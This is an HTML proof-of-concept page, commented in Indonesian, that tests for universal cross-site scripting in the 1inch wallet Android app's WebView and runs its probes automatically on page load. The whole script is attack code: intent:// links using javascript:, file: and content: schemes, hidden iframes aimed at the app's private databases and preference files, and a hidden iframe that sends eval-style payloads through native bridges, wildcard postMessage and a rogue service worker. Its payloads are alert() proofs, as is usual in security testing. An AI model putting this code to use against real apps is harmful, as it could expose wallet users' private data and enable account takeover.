<!DOCTYPE html>
<html>
<head>
<title>UXSS Test #3 - Intent Scheme + File/Content</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
<h1>🔬 UXSS Test #3</h1>

<script>
// ==============================================
// Teknik A: intent:// URL untuk trigger activity
// ==============================================
function tryIntentScheme() {
    var intents = [
        // Coba intent scheme yang bisa trigger WebView activities
        'intent://app.1inch.io/#Intent;scheme=https;package=com.1inch.wallet;end',
        // Coba intent dengan javascript: scheme
        'intent://#Intent;scheme=javascript;action=android.intent.action.VIEW;end',
        // Coba file scheme intent
        'intent://#Intent;scheme=file;action=android.intent.action.VIEW;end',
        // Coba content scheme
        'intent://#Intent;scheme=content;action=android.intent.action.VIEW;end'
    ];
    
    intents.forEach(function(intent, i) {
        var link = document.createElement('a');
        link.href = intent;
        link.textContent = 'Intent test #' + (i+1);
        link.style.display = 'block';
        link.style.margin = '5px 0';
        link.style.padding = '8px';
        link.style.background = '#eee';
        link.style.borderRadius = '4px';
        document.getElementById('intent-tests').appendChild(link);
    });
    
    log('Intent links added - click to test');
}

// ==============================================
// Teknik B: Coba akses file:/// via iframe
// ==============================================
function tryFileAccess() {
    var files = [
        'file:///data/data/com.1inch.wallet/databases/webview.db',
        'file:///data/data/com.1inch.wallet/shared_prefs/1inch_preferences.xml',
        'file:///data/local/tmp/',
        'file:///android_asset/',
        'file:///sdcard/',
        'content://com.1inch.wallet/'
    ];
    
    files.forEach(function(file, i) {
        var iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = file;
        iframe.onload = function() {
            log('iframe loaded: ' + file + ' (may indicate file access is allowed!)');
        };
        iframe.onerror = function() {
            log('iframe error: ' + file);
        };
        document.body.appendChild(iframe);
    });
    
    log('File access tests initiated');
}

// ==============================================
// Teknik C: Coba postWebMessage abuse
// ==============================================
function tryPostMessageAbuse() {
    // Buat iframe dengan kode yang mencoba kirim message ke native
    var iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.srcdoc = `
    <!DOCTYPE html>
    <html>
    <body>
    <script>
        // Coba berbagai metode komunikasi dengan native
    
        // Method 1: Android postMessage
        if(window.Android && window.Android.postMessage) {
            Android.postMessage(JSON.stringify({
                type: 'inject_js',
                code: 'alert("UXSS via Android bridge!" + document.domain)'
            }));
        }
    
        // Method 2: WebViewCompat
        if(window.chrome && window.chrome.webview) {
            window.chrome.webview.postMessage(JSON.stringify({
                type: 'eval',
                code: 'alert("UXSS via chrome.webview!")'
            }));
        }
    
        // Method 3: Generic postMessage ke berbagai target
        var targets = ['*', 'https://app.1inch.io', 'https://1inch.io', window.location.origin];
        targets.forEach(function(target) {
            try {
                window.parent.postMessage({
                    type: 'uxss_payload',
                    action: 'inject',
                    code: 'alert("UXSS from iframe! Domain: " + document.domain + " | parent: " + (parent ? parent.location.href : "N/A"))',
                    origin: document.domain || 'null',
                    location: window.location.href
                }, target);
            } catch(e) {}
        });
        // Method 4: BroadcastChannel
        try {
            var bc = new BroadcastChannel('uxss_channel');
            bc.postMessage({cmd: 'eval', code: 'alert("UXSS via BroadcastChannel!")'});
        } catch(e) {
            // BroadcastChannel mungkin tidak tersedia
        }
    
        // Method 5: ServiceWorker registration attempt (if allowed)
        try {
            if('serviceWorker' in navigator) {
                navigator.serviceWorker.register('data:text/javascript,' + encodeURIComponent(
                    'self.addEventListener("fetch", function(e) {' +
                    '    if(e.request.mode === "navigate") {' +
                    '        e.respondWith(new Response(' +
                    '            "<script>alert(\\'UXSS via SW! Domain: \\' + document.domain)<\\/script>",' +
                    '            {headers: {"Content-Type": "text/html"}}' +
                    '        ));' +
                    '    }' +
                    '});'
                ), {scope: '/'}).then(function() {
                    parent.postMessage({type: 'sw_registered'}, '*');
                }).catch(function() {
                    // SW registration failed - expected
                });
            }
        } catch(e) {}
    
        parent.postMessage({type: 'native_comm_test_complete', origin: document.domain || 'null'}, '*');
    <\/script>
    </body>
    </html>
    `;
    
    document.body.appendChild(iframe);
    log('Native communication tests initiated');
}

// ==============================================
// Helper
// ==============================================
function log(msg) {
    var div = document.getElementById('log');
    div.innerHTML += '<div style="margin:2px 0">[' + new Date().toLocaleTimeString() + '] ' + msg + '</div>';
}

window.addEventListener('message', function(e) {
    log('Message from ' + e.origin + ': ' + JSON.stringify(e.data).substring(0, 150));
});

// Run all tests
setTimeout(tryIntentScheme, 500);
setTimeout(tryFileAccess, 1500);
setTimeout(tryPostMessageAbuse, 3000);
</script>

<h3>Intent Tests:</h3>
<div id="intent-tests" style="margin:10px 0"></div>

<h3>Log:</h3>
<div id="log" style="background:#f5f5f5; padding:10px; border:1px solid #ccc; min-height:200px; font-family:monospace; font-size:12px;"></div>

</body>
</html>
